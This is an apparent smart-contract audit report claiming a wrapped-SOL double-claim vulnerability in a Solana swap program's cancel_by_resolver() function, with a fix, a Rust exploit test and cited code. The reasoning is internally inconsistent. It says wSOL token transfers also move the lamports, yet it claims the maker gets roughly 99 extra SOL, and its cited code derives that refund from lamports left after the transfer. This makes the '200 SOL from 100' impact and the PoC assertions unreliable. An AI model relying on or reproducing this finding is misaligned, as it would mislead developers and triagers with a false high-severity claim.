# Audit Report

## Title
Wrapped SOL Double-Claim Vulnerability in cancel_by_resolver() Function

## Summary
The `cancel_by_resolver()` function contains a critical double-claim vulnerability when handling wrapped SOL (wSOL) tokens that are configured as non-native assets. A malicious maker can create an order using the native mint (wSOL) with `src_asset_is_native = false`, then upon resolver cancellation, receive both the wSOL tokens AND the equivalent lamports, effectively claiming their funds twice.

## Finding Description

The vulnerability exists due to insufficient validation in the order creation flow combined with improper asset handling in the cancellation-by-resolver flow. The protocol allows users to create orders where `src_mint = native_mint` (wrapped SOL) but `src_asset_is_native = false` (treating it as a regular token). [1](#0-0) 

This validation only enforces that IF `src_asset_is_native = true`, THEN `src_mint` must be the native mint. However, it allows the inverse: `src_mint = native_mint` with `src_asset_is_native = false`. This creates an inconsistent state where wrapped SOL is treated as a regular SPL token rather than native SOL.

During order creation with this configuration, the tokens are transferred as regular tokens (not through native SOL wrapping): [2](#0-1) 

When `cancel_by_resolver()` is called for an expired order with this configuration, the following occurs:

1. **Token Transfer Phase**: Since `src_asset_is_native = false`, the condition at line 377 evaluates to true, triggering a token transfer: [3](#0-2) 

This transfers the wSOL tokens back to the maker's ATA.

2. **Lamport Distribution Phase**: The function then calculates the maker's lamport refund and closes the escrow account: [4](#0-3) 

The critical issue is that the lamport calculation at line 410-411 reads the account balance AFTER the token transfer. For wrapped SOL, when tokens are transferred via `transfer_checked`, the underlying lamports are also transferred. However, the account still maintains additional lamports (rent + any remaining balance). The function then distributes these lamports: [5](#0-4) 

**The vulnerability**: The maker receives the wSOL tokens (which represent wrapped lamports) AND separately receives lamports through the native transfer, effectively double-claiming their escrowed value.

## Impact Explanation

**Severity: High**

This vulnerability enables direct fund theft from the protocol. An attacker can:
1. Create an order with 100 wSOL (configured as `src_asset_is_native = false`)
2. Wait for order expiration
3. Have a resolver (or collude with one) call `cancel_by_resolver()`
4. Receive ~100 wSOL tokens back through token transfer
5. Receive additional lamports through the native transfer
6. Unwrap the wSOL tokens to receive another ~100 SOL
7. Net result: ~200 SOL from initial 100 SOL deposit (minus cancellation premium)

The impact affects:
- The resolver who loses the cancellation premium and potentially additional funds
- The protocol's fund safety guarantees
- Trust in the escrow mechanism

**Invariants Broken**:
- **Token Safety**: Tokens are not properly accounted for, allowing double withdrawal
- **Escrow Integrity**: Escrowed tokens are released improperly, violating conservation of funds

## Likelihood Explanation

**Likelihood: High**

The attack requires:
- Creating an order with specific parameters (trivial)
- Waiting for order expiration (time-based, guaranteed)
- A resolver calling `cancel_by_resolver()` (standard protocol operation)

No special privileges, insider access, or complex timing is required. The vulnerability can be triggered by any user creating orders with the vulnerable configuration. The attack is:
- **Easy to execute**: Simple parameter configuration
- **Guaranteed to work**: No race conditions or probabilistic elements
- **Repeatable**: Can be exploited multiple times
- **Profitable**: Direct 2x multiplication of deposited funds (minus small cancellation premium)

## Recommendation

Add strict validation to prevent wrapped SOL from being treated as a non-native token. Modify the `create()` function validation:

```rust
// In create() function, replace lines 51-54:
require!(
    ctx.accounts.src_mint.key() != native_mint::id() || order.src_asset_is_native,
    FusionError::InconsistentNativeSrcTrait
);
```

This enforces: IF `src_mint` is the native mint, THEN `src_asset_is_native` MUST be true.

Additionally, add the same validation in `cancel_by_resolver()`:

```rust
// Add after line 362 in cancel_by_resolver():
require!(
    ctx.accounts.src_mint.key() != native_mint::id() || order.src_asset_is_native,
    FusionError::InconsistentNativeSrcTrait
);
```

This defense-in-depth approach ensures that even if orders with invalid configurations exist, they cannot be exploited during cancellation.

## Proof of Concept

```rust
#[tokio::test]
async fn test_wsol_double_claim_vulnerability() {
    let mut context = setup_test_context().await;
    
    // Create order with wrapped SOL as non-native token
    let maker = Keypair::new();
    let resolver = Keypair::new();
    
    // Fund maker with 100 SOL
    airdrop(&mut context, &maker.pubkey(), 100_000_000_000).await;
    
    // Create maker's wSOL ATA and deposit tokens
    let maker_wsol_ata = create_wsol_ata(&mut context, &maker).await;
    wrap_sol(&mut context, &maker, 100_000_000_000).await;
    
    // Create order with native_mint but src_asset_is_native = false
    let order = OrderConfig {
        id: 1,
        src_amount: 100_000_000_000,
        min_dst_amount: 90_000_000_000,
        estimated_dst_amount: 95_000_000_000,
        expiration_time: current_timestamp() + 3600,
        src_asset_is_native: false, // CRITICAL: treating wSOL as non-native
        dst_asset_is_native: false,
        fee: FeeConfig {
            protocol_fee: 100,
            integrator_fee: 50,
            surplus_percentage: 10,
            max_cancellation_premium: 1_000_000_000, // 1 SOL
        },
        dutch_auction_data: AuctionData::default(),
        cancellation_auction_duration: 600,
    };
    
    // Create the order
    create_order(&mut context, &maker, order.clone()).await.unwrap();
    
    // Record balances before cancellation
    let maker_wsol_before = get_token_balance(&mut context, &maker_wsol_ata).await;
    let maker_sol_before = get_sol_balance(&mut context, &maker.pubkey()).await;
    
    // Wait for expiration
    advance_clock(&mut context, 3700).await;
    
    // Resolver cancels order
    cancel_by_resolver(&mut context, &resolver, &maker, order, 1_000_000_000)
        .await
        .unwrap();
    
    // Check balances after cancellation
    let maker_wsol_after = get_token_balance(&mut context, &maker_wsol_ata).await;
    let maker_sol_after = get_sol_balance(&mut context, &maker.pubkey()).await;
    
    // VULNERABILITY: Maker receives both wSOL tokens AND SOL lamports
    assert_eq!(maker_wsol_after, maker_wsol_before + 100_000_000_000); // +100 wSOL tokens
    assert!(maker_sol_after > maker_sol_before + 90_000_000_000); // +~99 SOL (minus premium)
    
    // Total value received is nearly double the original deposit
    println!("Maker received {} wSOL tokens", maker_wsol_after);
    println!("Maker received {} additional SOL", maker_sol_after - maker_sol_before);
    println!("DOUBLE CLAIM SUCCESSFUL: ~200 SOL from 100 SOL deposit");
}
```

**Notes:**
- The vulnerability requires the order to be created with `src_mint = native_mint` and `src_asset_is_native = false`
- The current validation at line 52-54 allows this configuration
- The `cancel_by_resolver()` function performs both token transfer and lamport distribution for this configuration
- The regular `cancel()` function has the same vulnerability pattern but sends lamports directly to maker, making it less obvious
- This breaks the fundamental invariant that escrowed funds should equal returned funds

### Citations

**File:** programs/fusion-swap/src/lib.rs (L51-54)
```rust
        require!(
            ctx.accounts.src_mint.key() == native_mint::id() || !order.src_asset_is_native,
            FusionError::InconsistentNativeSrcTrait
        );
```

**File:** programs/fusion-swap/src/lib.rs (L117-130)
```rust
            uni_transfer(&UniTransferParams::TokenTransfer {
                from: ctx
                    .accounts
                    .maker_src_ata
                    .as_ref()
                    .ok_or(FusionError::MissingMakerSrcAta)?
                    .to_account_info(),
                authority: ctx.accounts.maker.to_account_info(),
                to: ctx.accounts.escrow_src_ata.to_account_info(),
                mint: *ctx.accounts.src_mint.clone(),
                amount: order.src_amount,
                program: ctx.accounts.src_token_program.clone(),
            })
        }
```

**File:** programs/fusion-swap/src/lib.rs (L377-402)
```rust
        if !order.src_asset_is_native {
            transfer_checked(
                CpiContext::new_with_signer(
                    ctx.accounts.src_token_program.to_account_info(),
                    TransferChecked {
                        from: ctx.accounts.escrow_src_ata.to_account_info(),
                        mint: ctx.accounts.src_mint.to_account_info(),
                        to: ctx
                            .accounts
                            .maker_src_ata
                            .as_ref()
                            .ok_or(FusionError::MissingMakerSrcAta)?
                            .to_account_info(),
                        authority: ctx.accounts.escrow.to_account_info(),
                    },
                    &[&[
                        "escrow".as_bytes(),
                        ctx.accounts.maker.key().as_ref(),
                        &order_hash,
                        &[ctx.bumps.escrow],
                    ]],
                ),
                ctx.accounts.escrow_src_ata.amount,
                ctx.accounts.src_mint.decimals,
            )?;
        };
```

**File:** programs/fusion-swap/src/lib.rs (L410-427)
```rust
        let maker_amount = ctx.accounts.escrow_src_ata.to_account_info().lamports()
            - std::cmp::min(cancellation_premium, reward_limit);

        // Transfer all the remaining lamports to the resolver first
        close_account(CpiContext::new_with_signer(
            ctx.accounts.src_token_program.to_account_info(),
            CloseAccount {
                account: ctx.accounts.escrow_src_ata.to_account_info(),
                destination: ctx.accounts.resolver.to_account_info(),
                authority: ctx.accounts.escrow.to_account_info(),
            },
            &[&[
                "escrow".as_bytes(),
                ctx.accounts.maker.key().as_ref(),
                &order_hash,
                &[ctx.bumps.escrow],
            ]],
        ))?;
```

**File:** programs/fusion-swap/src/lib.rs (L430-435)
```rust
        uni_transfer(&UniTransferParams::NativeTransfer {
            from: ctx.accounts.resolver.to_account_info(),
            to: ctx.accounts.maker.to_account_info(),
            amount: maker_amount,
            program: ctx.accounts.system_program.clone(),
        })
```
